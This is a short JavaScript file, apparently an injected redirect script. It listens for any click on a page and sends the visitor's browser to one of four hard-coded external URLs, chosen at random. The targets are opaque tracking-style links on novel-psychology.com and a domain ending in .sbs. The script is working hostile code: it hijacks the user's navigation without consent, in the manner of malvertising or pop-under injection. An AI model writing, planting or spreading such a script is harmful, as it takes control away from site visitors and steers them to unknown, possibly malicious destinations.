function init() {
  var arr = [
    "https://novel-psychology.com/bv3.VW0fPo3lpEvcbemFVZJmZWDW0C1TMzzHMcx_NKjmE/zrLJTIUOz-MizuED2qMUTvQb",
    "https://novel-psychology.com/bV3jV/0qP.3ipev/b/m-V/JJZaDm0C1bM/TBkD5hNaDHA/w/LbTVUBxZOnTRkn0yMXDoEm",
    "https://novel-psychology.com/b/3NV.0uP/3bpavkbImwVgJwZ/D/0r1rMbTBkt5/MlztgfyNL-TBU_x/OKTbk/ziOuDUMk",
    "https://mango.mjsj.sbs",
  ];
 
  var didOpen = false;
  // 监听页面的点击事件
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();